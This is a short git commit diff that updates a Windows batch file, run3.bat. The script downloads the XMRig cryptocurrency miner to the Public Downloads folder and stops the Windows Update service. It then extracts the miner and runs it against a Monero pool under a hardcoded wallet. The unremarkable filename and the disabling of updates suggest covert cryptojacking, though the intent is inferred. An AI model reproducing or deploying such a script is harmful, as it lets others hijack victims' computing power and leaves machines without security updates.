9f94ab0bf99ce076b2305f52196614690b423830
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-23 09:31:46 -0300

    Update run3.bat

--- run3.bat
+++ run3.bat
@@ -1,6 +1,5 @@
-cd /d "%~dp0"
-curl https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-gcc-win64.zip --output C:\\Users\\Public\\Downloads\\xmrig.zip
-tar -xf xmrig.zip
+curl.exe https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-gcc-win64.zip -L -o C:\\Users\\Public\\Downloads\\xmrig.zip
 net stop WUAUSERV
 cd /d "%~dp0"
+tar -xf xmrig.zip
 xmrig-6.18.1\\xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.LearnTeste -p x -t 6
